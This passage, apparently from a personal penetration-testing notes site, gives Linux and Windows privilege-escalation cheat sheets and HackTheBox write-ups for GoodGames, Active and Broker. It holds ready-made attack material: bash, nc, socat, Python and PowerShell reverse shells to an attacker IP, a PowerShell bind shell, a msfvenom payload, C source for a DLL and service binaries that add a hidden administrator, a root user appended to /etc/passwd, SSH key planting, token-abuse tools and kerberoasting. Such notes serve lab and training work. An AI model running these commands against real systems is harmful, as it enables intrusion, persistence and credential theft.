/bin/sh\n/bin/sh\n$ \n</code></pre> <pre><code># On the host\n\n# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user\naugustus@GoodGames:~$ ps -auxf | grep /bin/sh\nroot      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \\_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'\nroot      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \\_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'\naugustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \\_ /bin/sh\naugustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \\_ grep /bin/sh\n\n# The process ID is 1659 in this case\n# Grep for the sda for HTB{ through the process:\naugustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda \nHTB{7h4T_w45_Tr1cKy_1_D4r3_54y}\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/","title":"ENUM","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/#enum_1","title":"enum","text":"<pre><code>tty #always verify it is a tty\ncat /etc/passwd\nhostname\ncat /etc/issue\ncat /etc/*release\nuname -a\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/#enum_network","title":"enum_network","text":"<pre><code>ip a\nifconfig\nroute\nroutel\nnetstat -anp\nss -anp\n\ncat /etc/iptables/rules.v4\nls -la /etc/iptables\n\nip addr\nip route\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/#cron","title":"cron","text":"<pre><code>ls -lah /etc/cron*\ncrontab -l\nsudo crontab -l\ncat /etc/crontab\ngrep \"CRON\" /var/log/syslog\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/#installed_programs","title":"installed_programs","text":"<pre><code>dpkg -l\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/#file_perms","title":"file_perms","text":"<pre><code>find / -writable -type d 2&gt;/dev/null\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/#partitions","title":"partitions","text":"<pre><code>cat /etc/fstab\nlsblk\nmount unmounted partitions and enum\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/#kernel_modules","title":"kernel_modules","text":"<pre><code>lsmod\n/sbin/modinfo [module]\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/#suidguid","title":"SUID/GUID","text":"<pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> <p>[[SUID]]</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/#sudo","title":"sudo","text":"<pre><code>sudo su # its worth a shot!\nsudo -l\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/ENUM/#passwdshadow","title":"passwd/shadow","text":"<pre><code>ls -la /etc/passwd\nls -la /etc/shadow\n</code></pre> <p>[[PASSWD]] [[SHADOW]] [[CAPABILITIES]]</p> <p>lse.sh linuxprivchecker linpeas</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/INTERNAL%20SERVICES/","title":"INTERNAL SERVICES","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/INTERNAL%20SERVICES/#ifconfig","title":"ifconfig","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/INTERNAL%20SERVICES/#chisel","title":"chisel","text":"<p>``` chisel server -p [port] --socks5 --reverse</p> <p>./chisel_1.7.7_linux_amd64 client [server ip]:[server port] R:socks</p> <p>sudo vi /etc/proxychains.conf</p> <p>proxychains nmap -A -p[port to scan] [ip to scan]</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/KERNEL%20EXPLOITS/","title":"KERNEL EXPLOITS","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/KERNEL%20EXPLOITS/#enum","title":"enum","text":"<pre><code>cat /etc/issue\nuname -r\narch\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/KERNEL%20EXPLOITS/#searchsploit","title":"searchsploit","text":"<pre><code>example\n\nsearchsploit \"linux kernel Ubuntu 16 Local Privilege Escalation\"   | grep  \"4.\" | grep -v \" &lt; 4.4.0\" | grep -v \"4.8\"\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/LINKS/","title":"LINKS","text":"<p>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://gtfobins.github.io/</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/LSE/","title":"LSE","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/PASSWD/","title":"PASSWD","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/PASSWD/#add_root_user","title":"add_root_user","text":"<pre><code>openssl passwd w00t\necho \"root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwd\nsu root2\n#paswd of w00t\nid\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/REVERSE%20SHELLS/","title":"REVERSE SHELLS","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/REVERSE%20SHELLS/#bash","title":"bash","text":"<pre><code>/bin/bash -i &gt;&amp; /dev/tcp/[attacker ip]/[attacker listening port] 0&gt;&amp;1\n\nforce bash\n/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/[attacker ip]/[attacker listening port] 0&gt;&amp;1' &amp;\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/REVERSE%20SHELLS/#msfvenom","title":"msfvenom","text":"<pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f elf &gt; shell-x86.elf\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/REVERSE%20SHELLS/#nc","title":"nc","text":"<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [attacker ip] [attacker listening port] &gt;/tmp/f\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/REVERSE%20SHELLS/#socat","title":"socat","text":"<pre><code>attacker&gt; socat TCP-LISTEN:[port],reuseaddr FILE:`tty`,raw,echo=0\nvictim&gt; socat TCP4:[attacker_ip]:[port] EXEC:bash,pty,stderr,setsid,sigint,sane\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/SERVICE%20FOOTPRINT/","title":"SERVICE FOOTPRINT","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/SERVICE%20FOOTPRINT/#running_processes","title":"running_processes","text":"<pre><code># SERVICE FOOTPRINT\nwatch -n 1 \"ps -aux | grep pass\"\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/SERVICE%20FOOTPRINT/#tcpdump","title":"tcpdump","text":"<pre><code># grep traffic through loopback for \"pass\"\nsudo tcpdump -i lo -A | grep \"pass\"\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/SHADOW/","title":"SHADOW","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/SSH%20KEYS/","title":"SSH KEYS","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/SSH%20KEYS/#overwrite_authorized_keys","title":"overwrite_authorized_keys","text":"<pre><code>ssh-keygen\n\ncat fileup.pub &gt; authorized_keys\n\nLFI to overwrite ../../../../../../root/.ssh/authorized_keys\n</code></pre> <pre><code>gyrsec@htb[/htb]$ ssh-keygen -f key\n\ngyrsec@htb[/htb]$ cat ./key.pub\n\nuser@remotehost$ echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys\n\ngyrsec@htb[/htb]$ ssh root@[ip] -i key\n</code></pre> <p>search .ssh directory</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/SUID/","title":"SUID","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/SUID/#enum","title":"enum","text":"<pre><code>find /* -user root -perm -4000 -print 2&gt;/dev/null\n\n#SUID\nfind / -perm -u=s -type f 2&gt;/dev/null\n\n#GUID\nfind / -perm -g=s -type f 2&gt;/dev/null\n</code></pre> <p>https://gtfobins.github.io/</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/SUID/#exploitable","title":"exploitable","text":"<pre><code>Nmap\nVim\nfind\nBash\nMore\nLess\nNano\ncp\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/SUID/#nonexploitable","title":"nonexploitable","text":"<pre><code>ping\nping6\npasswd\nsudo\nchfn\napring\ngpasswd\nchsh\nchfn\nmount\nsudo\nsu\numount\nmount\nnewgrp\npppd\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/UPGRADE%20SHELL/","title":"UPGRADE SHELL","text":"<p>python</p> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>/usr/bin/perl -e 'exec \"/bin/bash\";'\n</code></pre> <p>won't work? work around</p> <pre><code>#! /bin/bash   \nset -m\n</code></pre> <p>socat</p> <p>upgrade tty - Spawning bash with python:</p> <pre><code>$ python -c 'import pty; pty.spawn(\"/bin/bash\")'\n$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <ul> <li>Background\u2019ing the remote shell with CTRL-Z:</li> </ul> <pre><code>user@remote:~$ ^Z\n</code></pre> <ul> <li>Getting ROWS and COLS within current terminal window:</li> </ul> <pre><code>user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\\n/'\n</code></pre> <ul> <li>Ignoring hotkeys in the local shell and getting back to the remote:</li> </ul> <pre><code>user@local:~$ stty raw -echo; fg\n</code></pre> <ul> <li>Setting correct size for the remote shell (where <code>ROWS</code> and <code>COLS</code> are the values from the 3rd bullet):</li> </ul> <pre><code>user@remote:~$ stty rows ROWS cols COLS\n</code></pre> <ul> <li>Adding some colors:</li> </ul> <pre><code>user@remote:~$ export TERM=xterm-256color\n</code></pre> <ul> <li>Reloading bash to apply the TERM variable:</li> </ul> <pre><code>user@remote:~$ exec /bin/bash\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/USER%20TRAILS/","title":"USER TRAILS","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/USER%20TRAILS/#environment_vars","title":"environment_vars","text":"<pre><code>env\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/LINUX/USER%20TRAILS/#dotfiles","title":"dotfiles","text":"<pre><code>.bashrc\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/BIND%20SHELLS/","title":"BIND SHELLS","text":"<pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]&lt;port&gt;; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/DLL%20HIJACK/","title":"DLL HIJACK","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/DLL%20HIJACK/#enum","title":"enum","text":"<pre><code>#looking for programs outside of C:\\Windows, ie manually installed\n\nGet-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/DLL%20HIJACK/#enum_permissions","title":"enum_permissions","text":"<pre><code>procmon to check for dlls\nif don't haver  permissions install locally and use procmon\nicacls [file]\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/DLL%20HIJACK/#code","title":"code","text":"<pre><code>#compile: x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll\n#can use msfvenom as well\n\n#include &lt;stdlib.h&gt;\n#include &lt;windows.h&gt;\n\nBOOL APIENTRY DllMain(\nHANDLE hModule,// Handle to DLL module\nDWORD ul_reason_for_call,// Reason for calling function\nLPVOID lpReserved ) // Reserved\n{\n    switch ( ul_reason_for_call )\n    {\n        case DLL_PROCESS_ATTACH: // A process is loading the DLL.\n        int i;\n        i = system (\"net user [username] [password] /add\");\n        i = system (\"net localgroup administrators [username] /add\");\n        break;\n        case DLL_THREAD_ATTACH: // A process is creating a new thread.\n        break;\n        case DLL_THREAD_DETACH: // A thread exits normally.\n        break;\n        case DLL_PROCESS_DETACH: // A process unloads the DLL.\n        break;\n    }\n    return TRUE;\n}\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/DLL%20HIJACK/#dll_search_order","title":"dll_search_order","text":"<pre><code>#place dll in one of these\n\n- The directory from which the application loaded.\n- The system directory.\n- The 16-bit system directory.\n- The Windows directory. \n- The current directory.\n- The directories that are listed in the PATH environment variable.\n</code></pre> <p>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/ENUM/","title":"ENUM","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/ENUM/#basic_enum","title":"basic_enum","text":"<pre><code>- Username and hostname\n- Group memberships of the current user\n- Existing users and groups\n- Operating system, version and architecture\n- Network information\n- Installed applications\n- Running processes\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/ENUM/#basic","title":"basic","text":"<pre><code>whoami /all\nwhoami /priv\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/ENUM/#results","title":"results","text":"<p>[[SeImpersonatePrivilege]] [[SeAssignPrimaryToken]] [[SeLoadDriverPrivilege]]</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/ENUM/#what_shell","title":"what_shell","text":"<pre><code>(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/ENUM/#commands","title":"commands","text":"<pre><code>whoami - get user name and hostname\nsysteminfo - system info\nGet-LocalGroup - PS\nnet localgroup - cmd\nGet-LocalGroupMember [group]\nipconfig /all\nroute print - useful to determine possible attack vectors to other systems or networks\nnetstat -ano\n\n#get all installed software\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\n\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\n#above can miss some software, check C:\\Program Files and C:\\Program Files (x64) and user downloads folder\n\nGet-Process - list running processes in PS\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/ENUM/#file_search","title":"file_search","text":"<pre><code>Get-ChildItem -Path C:\\xampp -Include *.txt, *.pdf, *.xls, *.xlsx, *.doc, *.docx, *.ini, *.kdbx -File -Recurse -ErrorAction SilentlyContinue\n#interesting file types\n# ENUM\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/ENUM/#powershell_history","title":"powershell_history","text":"<pre><code>(Get-PSReadlineOption).HistorySavePath\ncheck for transcript files\nsearch in eventviewer for powershell script block logging with passwords\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/ENUM/#seatbelt","title":"seatbelt","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/ENUM/#file_search_1","title":"file_search","text":"<pre><code>Get-ChildItem -Path C:\\ -Filter soffice.ps1 -Recurse -ErrorAction SilentlyContinue -Force\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/LINKS/","title":"LINKS","text":"<p>https://lolbas-project.github.io/#</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PASSWORDS/","title":"PASSWORDS","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PASSWORDS/#file_search","title":"file_search","text":"<pre><code>Get-ChildItem -Path \"C:\\Users\" -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue\n#interesting file types\n# PASSWORDS\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PASSWORDS/#powershell_history","title":"powershell_history","text":"<pre><code>(Get-PSReadlineOption).HistorySavePath\ncheck for transcript files\nsearch in eventviewer for powershell script block logging with passwords\n</code></pre> <p>[[MIMIKATZ]] </p>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/REVERSE%20SHELL/","title":"REVERSE SHELL","text":"<p>[[LATERAL MOVEMENT/AD/REVERSE SHELL|REVERSE SHELL]] </p> <pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('[attacker ip]',[attacker listening port]);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '&gt; ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/SCHEDULED%20TASKS/","title":"SCHEDULED TASKS","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/SCHEDULED%20TASKS/#enum","title":"enum","text":"<pre><code>Get-ScheduledTask\nschtasks /query /fo LIST /v\n</code></pre> <p>check [[UNQUOTED PATH]] for binaries / icacls /etc</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/SCRIPTS/","title":"SCRIPTS","text":"<p>jaws     https://github.com/411Hall/JAWS seatbelt     https://github.com/GhostPack/Seatbelt winpeass     https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/SERVICE%20BINARY%20HIJACKING/","title":"SERVICE BINARY HIJACKING","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/SERVICE%20BINARY%20HIJACKING/#query_services","title":"query_services","text":"<pre><code>services.msc\nGet-Service\nGet-CimInstance\n\nGet-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/SERVICE%20BINARY%20HIJACKING/#enum_permissions","title":"enum_permissions","text":"<pre><code>icacls\nGet-ACL\n\nicacls mask / perms\nF - Full \nM - Modify \nRX - Read + Execute\nR - Read Only\nW - Write Only\n\nicacls [some file]\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/SERVICE%20BINARY%20HIJACKING/#malicious_binary","title":"malicious_binary","text":"<pre><code>#compile: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n#IF NON ADMIN USER MAY NOT HAVE PRIVS FOR THIS TRY REVSHELL\n\n#include &lt;stdlib.h&gt;\n\nint main ()\n{\n  int i;\n\n  i = system (\"net user [username] [password] /add\");\n  i = system (\"net localgroup administrators [username] /add\");\n\n  return 0;\n}\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/SERVICE%20BINARY%20HIJACKING/#exploit","title":"exploit","text":"<pre><code>#replace binary with malicious binary\n#restart service or reboot computer if autopmatic start\n\nnet stop / net start \nGet-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}\n\n#need SeShutDownPrivilege\nwhoami /priv\n#The tokens that appear as Disabled can be enable, you you actually can abuse _Enabled_ and _Disabled_ tokens\n\nshutdown /r /t 0\n</code></pre> <p>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</p>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/UNQUOTED%20PATH/","title":"UNQUOTED PATH","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/UNQUOTED%20PATH/#enum","title":"enum","text":"<pre><code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName\n\nor better yet in cmd:\nwmic service get name,pathname |  findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/UNQUOTED%20PATH/#malicious_binary","title":"malicious_binary","text":"<pre><code>#compile: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n#if non admin user may not have privs for this try revshell\n\n#include &lt;stdlib.h&gt;\n\nint main ()\n{\n  int i;\n\n  i = system (\"net user [user] [password] /add\");\n  i = system (\"net localgroup administrators [user] /add\");\n\n  return 0;\n}\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/UNQUOTED%20PATH/#check_perms","title":"check_perms","text":"<pre><code>Start-Service [service] / Stop-Service [service]\nicacls \"C:\\\"\nicacls \"C:\\Program Files\"\nicacls \"C:\\Program Files\\Enterprise Apps\"\n\n    OUTPUT:BUILTIN\\Users:(OI)(CI)(RX,W)\n\n    we have write access so we can exploit\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/UNQUOTED%20PATH/#exploit","title":"exploit","text":"<pre><code>icacls \"C:\\Program Files\\Enterprise Apps\"\n\n    OUTPUT:BUILTIN\\Users:(OI)(CI)(RX,W)\n\n    we have write access, so drop exe named Current.exe at C:\\Program Files\\Enterprise \n    Apps\\Current.exe\n\niwr -uri http://[ip]/adduser.exe -Outfile Current.exe\nor wget\n\nStart-Service [service]\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PRIVS/SeAssignPrimaryToken/","title":"SeAssignPrimaryToken","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PRIVS/SeAssignPrimaryToken/#juicypotato","title":"juicypotato","text":"<p>https://github.com/ohpe/juicy-potato https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</p> <pre><code>.\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *\n.\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c &lt;CLSID&gt;\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PRIVS/SeBackupPrivilege/","title":"SeBackupPrivilege","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PRIVS/SeDebug/","title":"SeDebug","text":""},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PRIVS/SeImpersonatePrivilege/","title":"SeImpersonatePrivilege","text":"<p>wget #juicypotato https://github.com/ohpe/juicy-potato https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</p> <pre><code>.\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *\n.\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c &lt;CLSID&gt;\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PRIVS/SeImpersonatePrivilege/#printspoofer","title":"printspoofer","text":"<pre><code>.\\PrintSpoofer64.exe -i -c cmd.exe\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PRIVS/SeImpersonatePrivilege/#juicypotatong","title":"JuicyPotatoNG","text":"<pre><code>must use full paths, not interactive?\n.\\JuicyPotatoNG.exe -t * -p \"C:\\Windows\\system32\\cmd.exe\" -a \"/c C:\\Users\\[user]\\nc.exe [ip] [port] -e cmd\"\n</code></pre>"},{"location":"PRIVILEGE%20ESCALATION/OS/WINDOWS/PRIVS/SeLoadDriverPrivilege/","title":"SeLoadDriverPrivilege","text":""},{"location":"VMs/HTB/Active/","title":"Active","text":"Name Platform Difficulty Active HackTheBox Easy <p>Active is an easy box, as the name suggests it centers around Active Directory, first exploiting an old Windows feature, Group Policy Preferences (GPP) then leveraging the account to perform kerberoasting and obtain the Administrator password</p> <p>add to /etc/hosts <code>10.10.10.100    active active.htb</code></p> <p><code>nmap -sC -sV active</code></p> <pre><code>Nmap scan report for active (10.10.10.100)\nHost is up (0.021s latency).\nNot shown: 983 closed tcp ports (conn-refused)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-25 04:08:55Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n49152/tcp open  msrpc         Microsoft Windows RPC\n49153/tcp open  msrpc         Microsoft Windows RPC\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-06-25T04:09:51\n|_  start_date: 2024-06-25T03:44:14\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled and required\n</code></pre> <p>2008 r2, I checked for Eternal Blue but it isn't quite that easy. </p> <p>After some basic enum against active directory I find the Replication share is accessible</p> <p></p> <p>Exploring the fileshare I find a few files, but the relevant one is Groups.xml </p> <p></p> <p>Hacktricks provides a good breakdown here but the short of it is that Windows used to allow for deploying local administrator accounts with Group Policy Preferences, using a known key to encrypt the passwords</p> <p></p> <p>I tried psexec with the compromised user but again it won't be that easy</p> <p></p> <p>The reason psexec is not working is that we do not have access to ADMIN$</p> <p></p> <p>I can get the user flag through the Users share but the account name SVC_TGS sounds like a hint for kerberoasting, and grabbing a flag without a shell is not as satisfying. I used impacket-GetUserSPNS for kerberoasting</p> <p></p> <p>Hashcat makes quick work of cracking <code>hashcat -m 13100 --force -a 0 hashes.kerberoast /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt</code></p> <p></p> <p>You can use <code>hashcat --show [hash file]</code> to view previously cracked passwords, using the administrator password with psexec I get a remote shell as system!</p> <p></p> <p>All in all a very easy box but it is a nice break from all the hackthebox vms I have been going through lately which start with a web application.</p>"},{"location":"VMs/HTB/Broker/","title":"Broker","text":"Name Platform Difficulty Broker HackTheBox Easy <p>Add the host to /etc/hosts for convenience</p> <pre><code>10.10.11.243    broker broker.htb\n</code></pre>"},{"location":"VMs/HTB/Broker/#initial-enum","title":"Initial Enum","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -sC -sV broker \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 00:09 EDT\nNmap scan report for broker (10.10.11.243)\nHost is up (0.017s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  basic realm=ActiveMQRealm\n|_http-title: Error 401 Unauthorized\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.49 seconds\n</code></pre> <p>First let's investigate the http site</p> <p></p> <p>We are presented with a login screen, trying admin:admin gets us through to ActiveMQ</p> <p></p> <p>Clicking on Manage ActiveMQ broker validates that we have admin privileges and shows that we are running version 5.15.15 with a copyright up to 2020, which feels a little old. Let's see if there are any useful exploits with searchsploit and 